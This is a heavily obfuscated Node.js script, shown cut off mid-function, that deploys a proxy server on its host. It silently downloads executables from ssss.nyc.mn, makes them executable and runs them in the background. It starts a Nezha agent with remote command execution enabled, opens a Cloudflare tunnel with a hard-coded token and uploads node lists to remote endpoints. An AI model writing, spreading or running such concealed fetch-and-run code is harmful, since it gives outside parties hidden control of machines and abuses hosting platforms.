const _0x5a7c31=_0x1f98;(function(_0x152b39,_0x54a9f5){const _0x7adb91={_0x465259:0x119,_0x1ce0c8:0xf0,_0x8f207d:0xef,_0x7506c6:0x107,_0x5e3355:0x83,_0x3f90eb:0x113},_0x46d2cb=_0x1f98,_0x298c43=_0x152b39();while(!![]){try{const _0x45a5e2=parseInt(_0x46d2cb(_0x7adb91._0x465259))/0x1+-parseInt(_0x46d2cb(_0x7adb91._0x1ce0c8))/0x2+-parseInt(_0x46d2cb(_0x7adb91._0x8f207d))/0x3*(-parseInt(_0x46d2cb(0xe9))/0x4)+parseInt(_0x46d2cb(0x105))/0x5+parseInt(_0x46d2cb(0x117))/0x6+parseInt(_0x46d2cb(_0x7adb91._0x7506c6))/0x7*(-parseInt(_0x46d2cb(0xc5))/0x8)+-parseInt(_0x46d2cb(_0x7adb91._0x5e3355))/0x9*(-parseInt(_0x46d2cb(_0x7adb91._0x3f90eb))/0xa);if(_0x45a5e2===_0x54a9f5)break;else _0x298c43['push'](_0x298c43['shift']());}catch(_0x42ee6a){_0x298c43['push'](_0x298c43['shift']());}}}(_0x3644,0xd3495));function _0x1f98(_0xe1e30b,_0x79072c){const _0x3644a0=_0x3644();return _0x1f98=function(_0x1f9888,_0x5b4c9d){_0x1f9888=_0x1f9888-0x7f;let _0x205716=_0x3644a0[_0x1f9888];return _0x205716;},_0x1f98(_0xe1e30b,_0x79072c);}const express=require(_0x5a7c31(0x12f)),app=express(),axios=require(_0x5a7c31(0xbe)),os=require('os'),fs=require('fs'),path=require(_0x5a7c31(0xf7)),{promisify}=require('util'),exec=promisify(require('child_process')[_0x5a7c31(0x96)]),UPLOAD_URL=process[_0x5a7c31(0xe1)]['UPLOAD_URL']||'',PROJECT_URL=process[_0x5a7c31(0xe1)][_0x5a7c31(0x91)]||'',AUTO_ACCESS=process[_0x5a7c31(0xe1)]['AUTO_ACCESS']||![],FILE_PATH=process['env']['FILE_PATH']||'.tmp',SUB_PATH=process[_0x5a7c31(0xe1)][_0x5a7c31(0xe8)]||'sub8964',PORT=process[_0x5a7c31(0xe1)][_0x5a7c31(0x10f)]||process['env'][_0x5a7c31(0x108)]||0xbb8,UUID=process['env'][_0x5a7c31(0x10a)]||'84705c0d-5036-44b1-a07e-d1582e658964',NEZHA_SERVER=process['env'][_0x5a7c31(0xba)]||'',NEZHA_PORT=process[_0x5a7c31(0xe1)]['NEZHA_PORT']||'',NEZHA_KEY=process['env'][_0x5a7c31(0x10c)]||'',ARGO_DOMAIN=process[_0x5a7c31(0xe1)][_0x5a7c31(0xf1)]||_0x5a7c31(0x9a),ARGO_AUTH=process['env']['ARGO_AUTH']||_0x5a7c31(0x97),ARGO_PORT=process[_0x5a7c31(0xe1)]['ARGO_PORT']||0x1f41,CFIP=process[_0x5a7c31(0xe1)]['CFIP']||'cdns.doon.eu.org',CFPORT=process[_0x5a7c31(0xe1)]['CFPORT']||0x1bb,NAME=process[_0x5a7c31(0xe1)][_0x5a7c31(0x122)]||_0x5a7c31(0xd6);!fs[_0x5a7c31(0x131)](FILE_PATH)?(fs[_0x5a7c31(0x112)](FILE_PATH),console[_0x5a7c31(0xc2)](FILE_PATH+_0x5a7c31(0xa2))):console[_0x5a7c31(0xc2)](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x22360c={_0x2233e5:0x9d,_0x5812d0:0xbf},_0x51b435=_0x5a7c31,_0x24287f='abcdefghijklmnopqrstuvwxyz';let _0x1d36ce='';for(let _0x3fba5e=0x0;_0x3fba5e<0x6;_0x3fba5e++){_0x1d36ce+=_0x24287f['charAt'](Math[_0x51b435(_0x22360c._0x2233e5)](Math[_0x51b435(_0x22360c._0x5812d0)]()*_0x24287f[_0x51b435(0xcd)]));}return _0x1d36ce;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x5a7c31(0x128)](FILE_PATH,npmName),phpPath=path[_0x5a7c31(0x128)](FILE_PATH,phpName),webPath=path[_0x5a7c31(0x128)](FILE_PATH,webName),botPath=path[_0x5a7c31(0x128)](FILE_PATH,botName),subPath=path[_0x5a7c31(0x128)](FILE_PATH,'sub.txt'),listPath=path[_0x5a7c31(0x128)](FILE_PATH,_0x5a7c31(0x81)),bootLogPath=path['join'](FILE_PATH,'boot.log'),configPath=path[_0x5a7c31(0x128)](FILE_PATH,_0x5a7c31(0x11d));function deleteNodes(){const _0xa08afe={_0x541d4c:0x129,_0x118a93:0xcb,_0x21b24b:0x12c,_0x46f385:0x110,_0x2a5342:0x8c,_0xcac25b:0xe6,_0x5d0260:0xa7,_0x92e14:0xb7,_0x27bd6d:0x12a},_0x1bdc89=_0x5a7c31;try{if(!UPLOAD_URL)return;if(!fs[_0x1bdc89(0x131)](subPath))return;let _0x4d7729;try{_0x4d7729=fs[_0x1bdc89(_0xa08afe._0x541d4c)](subPath,'utf-8');}catch{return null;}const _0x1b4bec=Buffer[_0x1bdc89(_0xa08afe._0x118a93)](_0x4d7729,_0x1bdc89(_0xa08afe._0x21b24b))[_0x1bdc89(_0xa08afe._0x46f385)](_0x1bdc89(_0xa08afe._0x2a5342)),_0x49bc30=_0x1b4bec[_0x1bdc89(_0xa08afe._0xcac25b)]('\x0a')[_0x1bdc89(_0xa08afe._0x5d0260)](_0x52b38e=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x1bdc89(0x109)](_0x52b38e));if(_0x49bc30[_0x1bdc89(0xcd)]===0x0)return;return axios[_0x1bdc89(_0xa08afe._0x92e14)](UPLOAD_URL+_0x1bdc89(_0xa08afe._0x27bd6d),JSON['stringify']({'nodes':_0x49bc30}),{'headers':{'Content-Type':'application/json'}})[_0x1bdc89(0x103)](_0x4d100a=>{return null;}),null;}catch(_0xafae05){return null;}}function cleanupOldFiles(){const _0x466b63={_0x3d6ed3:0x9b},_0x5b549b={_0x19c391:0xed,_0x514680:0xff},_0x422033=_0x5a7c31;try{const _0x4a85bc=fs[_0x422033(_0x466b63._0x3d6ed3)](FILE_PATH);_0x4a85bc['forEach'](_0x4bece4=>{const _0x3e9f08=_0x422033,_0x31d9fc=path[_0x3e9f08(0x128)](FILE_PATH,_0x4bece4);try{const _0x585f81=fs['statSync'](_0x31d9fc);_0x585f81[_0x3e9f08(_0x5b549b._0x19c391)]()&&fs[_0x3e9f08(_0x5b549b._0x514680)](_0x31d9fc);}catch(_0xdcbe02){}});}catch(_0x443712){}}async function generateConfig(){const _0x26fef6={_0x1c779d:0xb0,_0x388367:0x11b,_0xd809f9:0xdf,_0x1af246:0x80,_0x51c61e:0x132,_0x3535a2:0xd2,_0x26f5be:0x8a,_0x4e7b54:0xb5,_0x5a857b:0x128},_0x56c2d3=_0x5a7c31,_0x12e575={'log':{'access':_0x56c2d3(0xdb),'error':'/dev/null','loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x56c2d3(0x8f),'settings':{'clients':[{'id':UUID,'flow':_0x56c2d3(0x94)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0x56c2d3(0xb9),'dest':0xbbb},{'path':_0x56c2d3(_0x26fef6._0x1c779d),'dest':0xbbc}]},'streamSettings':{'network':_0x56c2d3(_0x26fef6._0x388367)}},{'port':0xbb9,'listen':_0x56c2d3(0xd2),'protocol':_0x56c2d3(0x8f),'settings':{'clients':[{'id':UUID}],'decryption':_0x56c2d3(0xdf)},'streamSettings':{'network':_0x56c2d3(0x11b),'security':_0x56c2d3(0xdf)}},{'port':0xbba,'listen':_0x56c2d3(0xd2),'protocol':_0x56c2d3(0x8f),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x56c2d3(0xdf)},'streamSettings':{'network':'ws','security':_0x56c2d3(_0x26fef6._0xd809f9),'wsSettings':{'path':_0x56c2d3(0x133)}},'sniffing':{'enabled':!![],'destOverride':[_0x56c2d3(0x80),_0x56c2d3(0x132),_0x56c2d3(0xcf)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x56c2d3(0xd2),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x56c2d3(_0x26fef6._0x1af246),_0x56c2d3(_0x26fef6._0x51c61e),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x56c2d3(_0x26fef6._0x3535a2),'protocol':_0x56c2d3(0xfe),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x56c2d3(0x80),'tls','quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x56c2d3(0xf8)]},'outbounds':[{'protocol':_0x56c2d3(_0x26fef6._0x26f5be),'tag':'direct'},{'protocol':_0x56c2d3(0xaa),'tag':_0x56c2d3(0xa3)}]};fs[_0x56c2d3(_0x26fef6._0x4e7b54)](path[_0x56c2d3(_0x26fef6._0x5a857b)](FILE_PATH,_0x56c2d3(0x11d)),JSON['stringify'](_0x12e575,null,0x2));}function getSystemArchitecture(){const _0x170abd={_0x94d27d:0x8d,_0x51403b:0x8d},_0x58e0e0=_0x5a7c31,_0x5699db=os['arch']();return _0x5699db===_0x58e0e0(_0x170abd._0x94d27d)||_0x5699db===_0x58e0e0(0x106)||_0x5699db===_0x58e0e0(0x11a)?_0x58e0e0(_0x170abd._0x51403b):'amd';}function _0x3644(){const _0x1142e5=['tunnel.yml','npm\x20running\x20error:\x20','8821680DfhLjv','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','512111jDaokC','aarch64','tcp','\x0a\x20\x20tunnel:\x20','config.json','https://amd64.ssss.nyc.mn/bot','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','unshift','web\x20running\x20error:\x20','NAME','pop','then','pipe','Nodes\x20uploaded\x20successfully','ArgoDomain:','join','readFileSync','/api/delete-nodes','2087','base64','application/json','firefox','express','get','existsSync','tls','/vless-argo','https://arm64.ssss.nyc.mn/web','\x22\x20>\x20/dev/null\x202>&1','Service\x20is\x20runing!<br><br>You\x20can\x20visit\x20/{SUB_PATH}(Default:\x20/sub)\x20get\x20your\x20nodes!','http','list.txt','map','261MDsRlk','send','country_code','includes','\x0aclient_secret:\x20','chmod','/api/add-nodes','freedom','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','utf-8','arm','taskkill\x20/f\x20/im\x20','vless','automatic\x20access\x20task\x20added\x20successfully','PROJECT_URL','\x0a\x20\x20credentials-file:\x20','https://arm64.ssss.nyc.mn/bot','xtls-rprx-vision','Subscription\x20uploaded\x20successfully','exec','eyJhIjoiZTE2NzcxNzg3ZTBmNmY4NWU4OTc2YmEzYmVmYjBjMWIiLCJ0IjoiNTBjOGQ4OTEtMTVmMC00MTE1LThkYzUtY2ZhMWFiZTRlN2VlIiwicyI6Ik9XUTFZbVUzTVdNdE5URmhNeTAwTVRSbExXRTRaVFF0TVRJeFpHVTVNall6T1dNMyJ9','clear','NEZHA\x20variable\x20is\x20empty,skip\x20running','galaxy.xbz.email','readdirSync','\x0avless://','floor','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','data','boot.log','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','\x20is\x20created','block','stringify','nohup\x20','8443','filter','Download\x20','2096','blackhole','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','org','Content-Type','false','&fp=firefox&type=ws&host=','/trojan-argo','\x0a\x0avmess://','https://oooo.serv00.net/add-url','status','response','writeFileSync','\x20>/dev/null\x202>&1','post','\x20>/dev/null\x202>&1\x20&','/vmess-argo','NEZHA_SERVER','forEach','rm\x20-rf\x20','https://amd64.ssss.nyc.mn/web','axios','random','http://ip-api.com/json','/config.json\x20>/dev/null\x202>&1\x20&','log','?encryption=none&security=tls&sni=','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','24FtLIJK','\x20is\x20running','2083','finish','http\x20server\x20is\x20running\x20on\x20port:','readFile','from','Empowerment\x20success\x20for\x20','length','\x20-c\x20','quic','set','message','127.0.0.1','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','close','listen','Galaxy','true','\x20failed:\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','success','/dev/null','error','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','del\x20/f\x20/q\x20','none','countryCode','env','App\x20is\x20running','&path=%2Fvless-argo%3Fed%3D2560#','fileUrl','fileName','split','Unhandled\x20error\x20in\x20startserver:','SUB_PATH','68XvksJT','substring','Unknown','Error\x20in\x20startserver:','isFile','push','37614NTxqGa','3274360ohwgTr','ARGO_DOMAIN','tunnel.json','TunnelSecret','443','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','utf8','path','https+local://8.8.8.8/dns-query','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','Empowerment\x20failed\x20for\x20','Error\x20reading\x20boot.log:','charAt','match','trojan','unlinkSync','?security=tls&sni=','pkill\x20-f\x20\x22[','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','catch','\x20-p\x20','1917220PJiKws','arm64','1091972qkTNZx','PORT','test','UUID','platform','NEZHA_KEY','--tls','ARGO_DOMAIN:','SERVER_PORT','toString','https://amd64.ssss.nyc.mn/v1','mkdirSync','135040ZlbhlV','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture'];_0x3644=function(){return _0x1142e5;};return _0x3644();}function downloadFile(_0x5b1c09,_0x15be3b,_0x5e9948){const _0x1835b3={_0x1fdcce:0x131},_0x5bd1ac={_0x1cd67e:0x125},_0x3382c2={_0x2925ec:0xa8},_0x1d087f=_0x5a7c31,_0x4d6716=_0x5b1c09;!fs[_0x1d087f(_0x1835b3._0x1fdcce)](FILE_PATH)&&fs[_0x1d087f(0x112)](FILE_PATH,{'recursive':!![]});const _0x514830=fs['createWriteStream'](_0x4d6716);axios({'method':'get','url':_0x15be3b,'responseType':'stream'})[_0x1d087f(0x124)](_0xd70c1f=>{const _0x382160=_0x1d087f;_0xd70c1f['data'][_0x382160(_0x5bd1ac._0x1cd67e)](_0x514830),_0x514830['on'](_0x382160(0xc8),()=>{const _0x4a8b52=_0x382160;_0x514830[_0x4a8b52(0xd4)](),console['log'](_0x4a8b52(_0x3382c2._0x2925ec)+path['basename'](_0x4d6716)+'\x20successfully'),_0x5e9948(null,_0x4d6716);}),_0x514830['on'](_0x382160(0xdc),_0x5f448b=>{const _0x915ff5=_0x382160;fs['unlink'](_0x4d6716,()=>{});const _0x439364=_0x915ff5(0xa8)+path['basename'](_0x4d6716)+'\x20failed:\x20'+_0x5f448b[_0x915ff5(0xd1)];console[_0x915ff5(0xdc)](_0x439364),_0x5e9948(_0x439364);});})[_0x1d087f(0x103)](_0x489f95=>{const _0x410a01=_0x1d087f,_0xeb6eb5=_0x410a01(0xa8)+path['basename'](_0x4d6716)+_0x410a01(0xd8)+_0x489f95['message'];console['error'](_0xeb6eb5),_0x5e9948(_0xeb6eb5);});}async function downloadFilesAndRun(){const _0x2f695a={_0x1646b5:0x114,_0x47297e:0x82,_0x4905d4:0x123,_0x3871a6:0xa6,_0x3548e9:0xa9,_0x26ebb8:0xc7,_0x42009b:0xd7,_0x51f8f5:0xae,_0x529fa5:0x87,_0xa677be:0x118,_0x30333b:0x128,_0x29d9b0:0x8b,_0xbf93cf:0xc2,_0x3a468e:0xa9,_0x92219:0x104,_0x53532d:0xdc,_0x32718b:0x99,_0x477530:0xce,_0x554b95:0xc6,_0x3482ce:0x121,_0x1c9a0e:0x131,_0x5dd27c:0xfd,_0x561d3a:0xf9,_0x241297:0xa5,_0x259f9b:0xb8,_0x1515c8:0xdc},_0x579e73={_0x2021b3:0xbb},_0x2b2c76={_0x1609fb:0x131,_0x1887d7:0x88},_0xbb8d7e=_0x5a7c31,_0x5c120f=getSystemArchitecture(),_0x46d641=getFilesForArchitecture(_0x5c120f);if(_0x46d641[_0xbb8d7e(0xcd)]===0x0){console['log'](_0xbb8d7e(_0x2f695a._0x1646b5));return;}const _0x43d477=_0x46d641[_0xbb8d7e(_0x2f695a._0x47297e)](_0x3f075c=>{return new Promise((_0x1b0b10,_0x581949)=>{const _0x276ebe=_0x1f98;downloadFile(_0x3f075c[_0x276ebe(0xe5)],_0x3f075c[_0x276ebe(0xe4)],(_0x201954,_0x19764f)=>{_0x201954?_0x581949(_0x201954):_0x1b0b10(_0x19764f);});});});try{await Promise['all'](_0x43d477);}catch(_0x5ed6c3){console[_0xbb8d7e(0xdc)]('Error\x20downloading\x20files:',_0x5ed6c3);return;}function _0x596356(_0x25cd8a){const _0x5c93b3=_0xbb8d7e,_0x40ed40=0x1fd;_0x25cd8a[_0x5c93b3(_0x579e73._0x2021b3)](_0x305e8a=>{const _0x7d1623=_0x5c93b3;fs[_0x7d1623(_0x2b2c76._0x1609fb)](_0x305e8a)&&fs[_0x7d1623(_0x2b2c76._0x1887d7)](_0x305e8a,_0x40ed40,_0x501b99=>{const _0x26b5cd=_0x7d1623;_0x501b99?console['error'](_0x26b5cd(0xfa)+_0x305e8a+':\x20'+_0x501b99):console[_0x26b5cd(0xc2)](_0x26b5cd(0xcc)+_0x305e8a+':\x20'+_0x40ed40['toString'](0x8));});});}const _0x25c862=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x596356(_0x25c862);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2ef2f4=NEZHA_SERVER[_0xbb8d7e(0x86)](':')?NEZHA_SERVER[_0xbb8d7e(0xe6)](':')[_0xbb8d7e(_0x2f695a._0x4905d4)]():'',_0x112d03=new Set(['443',_0xbb8d7e(_0x2f695a._0x3871a6),_0xbb8d7e(_0x2f695a._0x3548e9),_0xbb8d7e(0x12b),_0xbb8d7e(_0x2f695a._0x26ebb8),'2053']),_0x391bfb=_0x112d03['has'](_0x2ef2f4)?_0xbb8d7e(_0x2f695a._0x42009b):_0xbb8d7e(_0x2f695a._0x51f8f5),_0x399441=_0xbb8d7e(_0x2f695a._0x529fa5)+NEZHA_KEY+_0xbb8d7e(0xa1)+NEZHA_SERVER+_0xbb8d7e(_0x2f695a._0xa677be)+_0x391bfb+_0xbb8d7e(0xc4)+UUID;fs['writeFileSync'](path[_0xbb8d7e(_0x2f695a._0x30333b)](FILE_PATH,'config.yaml'),_0x399441);const _0xf62ac2=_0xbb8d7e(0xa5)+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0xbb8d7e(_0x2f695a._0x29d9b0);try{await exec(_0xf62ac2),console[_0xbb8d7e(_0x2f695a._0xbf93cf)](phpName+_0xbb8d7e(0xc6)),await new Promise(_0x194012=>setTimeout(_0x194012,0x3e8));}catch(_0x2a10cf){console[_0xbb8d7e(0xdc)]('php\x20running\x20error:\x20'+_0x2a10cf);}}else{let _0x5806ec='';const _0x4e94b9=[_0xbb8d7e(0xf4),_0xbb8d7e(0xa6),_0xbb8d7e(_0x2f695a._0x3a468e),'2087',_0xbb8d7e(_0x2f695a._0x26ebb8),'2053'];_0x4e94b9['includes'](NEZHA_PORT)&&(_0x5806ec=_0xbb8d7e(0x10d));const _0x3d31f6='nohup\x20'+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0xbb8d7e(_0x2f695a._0x92219)+NEZHA_KEY+'\x20'+_0x5806ec+_0xbb8d7e(0xf5);try{await exec(_0x3d31f6),console['log'](npmName+'\x20is\x20running'),await new Promise(_0x2f1fae=>setTimeout(_0x2f1fae,0x3e8));}catch(_0x5ab7cb){console[_0xbb8d7e(_0x2f695a._0x53532d)](_0xbb8d7e(0x116)+_0x5ab7cb);}}}else console[_0xbb8d7e(0xc2)](_0xbb8d7e(_0x2f695a._0x32718b));const _0x400476='nohup\x20'+webPath+_0xbb8d7e(_0x2f695a._0x477530)+FILE_PATH+_0xbb8d7e(0xc1);try{await exec(_0x400476),console[_0xbb8d7e(0xc2)](webName+_0xbb8d7e(_0x2f695a._0x554b95)),await new Promise(_0x3b585d=>setTimeout(_0x3b585d,0x3e8));}catch(_0x5275e9){console[_0xbb8d7e(0xdc)](_0xbb8d7e(_0x2f695a._0x3482ce)+_0x5275e9);}if(fs[_0xbb8d7e(_0x2f695a._0x1c9a0e)](botPath)){let _0x458363;if(ARGO_AUTH[_0xbb8d7e(_0x2f695a._0x5dd27c)](/^[A-Z0-9a-z=]{120,250}$/))_0x458363=_0xbb8d7e(0xd3)+ARGO_AUTH;else ARGO_AUTH[_0xbb8d7e(_0x2f695a._0x5dd27c)](/TunnelSecret/)?_0x458363='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+'/tunnel.yml\x20run':_0x458363=_0xbb8d7e(0xd9)+FILE_PATH+_0xbb8d7e(_0x2f695a._0x561d3a)+ARGO_PORT;try{await exec(_0xbb8d7e(_0x2f695a._0x241297)+botPath+'\x20'+_0x458363+_0xbb8d7e(_0x2f695a._0x259f9b)),console[_0xbb8d7e(0xc2)](botName+_0xbb8d7e(_0x2f695a._0x554b95)),await new Promise(_0x3c69b8=>setTimeout(_0x3c69b8,0x7d0));}catch(_0xabef80){console[_0xbb8d7e(_0x2f695a._0x1515c8)]('Error\x20executing\x20command:\x20'+_0xabef80);}}await new Promise(_0x28c327=>setTimeout(_0x28c327,0x1388));}function getFilesForArchitecture(_0x5127d1){const _0x219289={_0x532611:0x93,_0x131091:0x11e,_0x3c6da9:0x8d},_0x483ccc=_0x5a7c31;let _0x11252f;_0x5127d1===_0x483ccc(0x8d)?_0x11252f=[{'fileName':webPath,'fileUrl':_0x483ccc(0x134)},{'fileName':botPath,'fileUrl':_0x483ccc(_0x219289._0x532611)}]:_0x11252f=[{'fileName':webPath,'fileUrl':_0x483ccc(0xbd)},{'fileName':botPath,'fileUrl':_0x483ccc(_0x219289._0x131091)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x50e65a=_0x5127d1==='arm'?'https://arm64.ssss.nyc.mn/agent':'https://amd64.ssss.nyc.mn/agent';_0x11252f[_0x483ccc(0x120)]({'fileName':npmPath,'fileUrl':_0x50e65a});}else{const _0x438a8d=_0x5127d1===_0x483ccc(_0x219289._0x3c6da9)?'https://arm64.ssss.nyc.mn/v1':_0x483ccc(0x111);_0x11252f[_0x483ccc(0x120)]({'fileName':phpPath,'fileUrl':_0x438a8d});}}return _0x11252f;}function argoType(){const _0x1de401={_0x5c1767:0x86,_0x3ceb0f:0xb5,_0x5db194:0x128,_0xec9385:0xf2,_0x5bc83f:0x11c,_0x2e045a:0x92,_0x39d57b:0x9e,_0x4c9fdc:0x128,_0x272b8d:0x115,_0x4f702d:0x11f},_0x54c600=_0x5a7c31;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x54c600(0xc2)](_0x54c600(0xdd));return;}if(ARGO_AUTH[_0x54c600(_0x1de401._0x5c1767)](_0x54c600(0xf3))){fs[_0x54c600(_0x1de401._0x3ceb0f)](path[_0x54c600(_0x1de401._0x5db194)](FILE_PATH,_0x54c600(_0x1de401._0xec9385)),ARGO_AUTH);const _0x54fe54=_0x54c600(_0x1de401._0x5bc83f)+ARGO_AUTH['split']('\x22')[0xb]+_0x54c600(_0x1de401._0x2e045a)+path[_0x54c600(_0x1de401._0x5db194)](FILE_PATH,_0x54c600(0xf2))+_0x54c600(0xab)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x54c600(_0x1de401._0x39d57b);fs[_0x54c600(0xb5)](path[_0x54c600(_0x1de401._0x4c9fdc)](FILE_PATH,_0x54c600(_0x1de401._0x272b8d)),_0x54fe54);}else console['log'](_0x54c600(_0x1de401._0x4f702d));}async function extractDomains(){const _0x2f4f72={_0x4ccfaf:0x10e,_0x3484c5:0xa0,_0x21f139:0x8c,_0x3eb6ca:0xcd,_0x35b11d:0x127,_0xc6cbd3:0xc2,_0x105453:0x102,_0x2f1346:0xd9,_0x20ca28:0xb8},_0x177b03={_0x5db8ec:0x130,_0x5819a4:0x9f,_0x56b622:0x9f,_0x31d376:0xac,_0x3649e7:0x130,_0x44c8ec:0xda,_0x5a2e6d:0xe0,_0x4cb016:0xac,_0x1db023:0xeb},_0x425d16={_0xedcbea:0x8e,_0xf72885:0x135},_0x1b5f1e=_0x5a7c31;let _0x14584e;if(ARGO_AUTH&&ARGO_DOMAIN)_0x14584e=ARGO_DOMAIN,console[_0x1b5f1e(0xc2)](_0x1b5f1e(_0x2f4f72._0x4ccfaf),_0x14584e),await _0x373e66(_0x14584e);else try{const _0x3bb51e=fs[_0x1b5f1e(0x129)](path['join'](FILE_PATH,_0x1b5f1e(_0x2f4f72._0x3484c5)),_0x1b5f1e(_0x2f4f72._0x21f139)),_0x32dab3=_0x3bb51e['split']('\x0a'),_0x29102d=[];_0x32dab3[_0x1b5f1e(0xbb)](_0x2041fe=>{const _0x493dc0=_0x1b5f1e,_0x58a4d4=_0x2041fe[_0x493dc0(0xfd)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x58a4d4){const _0xf1a222=_0x58a4d4[0x1];_0x29102d['push'](_0xf1a222);}});if(_0x29102d[_0x1b5f1e(_0x2f4f72._0x3eb6ca)]>0x0)_0x14584e=_0x29102d[0x0],console[_0x1b5f1e(0xc2)](_0x1b5f1e(_0x2f4f72._0x35b11d),_0x14584e),await _0x373e66(_0x14584e);else{console[_0x1b5f1e(_0x2f4f72._0xc6cbd3)](_0x1b5f1e(_0x2f4f72._0x105453)),fs[_0x1b5f1e(0xff)](path[_0x1b5f1e(0x128)](FILE_PATH,_0x1b5f1e(_0x2f4f72._0x3484c5)));async function _0x20f0fa(){const _0x4e71de=_0x1b5f1e;try{process[_0x4e71de(0x10b)]==='win32'?await exec(_0x4e71de(_0x425d16._0xedcbea)+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0x4e71de(0x101)+botName[_0x4e71de(0xfc)](0x0)+']'+botName[_0x4e71de(0xea)](0x1)+_0x4e71de(_0x425d16._0xf72885));}catch(_0xa8e02d){}}_0x20f0fa(),await new Promise(_0x2448f7=>setTimeout(_0x2448f7,0xbb8));const _0x30d06a=_0x1b5f1e(_0x2f4f72._0x2f1346)+FILE_PATH+_0x1b5f1e(0xf9)+ARGO_PORT;try{await exec(_0x1b5f1e(0xa5)+botPath+'\x20'+_0x30d06a+_0x1b5f1e(_0x2f4f72._0x20ca28)),console[_0x1b5f1e(0xc2)](botName+'\x20is\x20running'),await new Promise(_0x3b823e=>setTimeout(_0x3b823e,0xbb8)),await extractDomains();}catch(_0x2deace){console['error']('Error\x20executing\x20command:\x20'+_0x2deace);}}}catch(_0x35f62e){console[_0x1b5f1e(0xdc)](_0x1b5f1e(0xfb),_0x35f62e);}async function _0x985ea6(){const _0x22a789=_0x1b5f1e;try{const _0x1aed4b=await axios[_0x22a789(_0x177b03._0x5db8ec)]('https://ipapi.co/json',{'timeout':0xbb8});if(_0x1aed4b[_0x22a789(_0x177b03._0x5819a4)]&&_0x1aed4b[_0x22a789(0x9f)][_0x22a789(0x85)]&&_0x1aed4b[_0x22a789(0x9f)][_0x22a789(0xac)])return _0x1aed4b[_0x22a789(_0x177b03._0x56b622)][_0x22a789(0x85)]+'_'+_0x1aed4b[_0x22a789(_0x177b03._0x5819a4)][_0x22a789(_0x177b03._0x31d376)];}catch(_0x41de93){try{const _0x12083b=await axios[_0x22a789(_0x177b03._0x3649e7)](_0x22a789(0xc0),{'timeout':0xbb8});if(_0x12083b['data']&&_0x12083b['data'][_0x22a789(0xb3)]===_0x22a789(_0x177b03._0x44c8ec)&&_0x12083b['data'][_0x22a789(_0x177b03._0x5a2e6d)]&&_0x12083b['data']['org'])return _0x12083b['data'][_0x22a789(_0x177b03._0x5a2e6d)]+'_'+_0x12083b[_0x22a789(0x9f)][_0x22a789(_0x177b03._0x4cb016)];}catch(_0x2ae0ec){}}return _0x22a789(_0x177b03._0x1db023);}async function _0x373e66(_0x4d9178){const _0x290bc1=await _0x985ea6(),_0xaf9be1=NAME?NAME+'-'+_0x290bc1:_0x290bc1;return new Promise(_0x3a21e8=>{const _0x42549d={_0x45943c:0xdf,_0x174ae0:0xdf,_0x3ce418:0xc3,_0x40b72a:0xe3,_0x5cfd4c:0xb1,_0x47fa5e:0x110,_0x27cea9:0x12c,_0x1ce315:0xc2,_0x7b20e6:0xcb},_0x5c89c8={_0x4516d4:0x110,_0x5cfea4:0xad,_0x2239ce:0x84};setTimeout(()=>{const 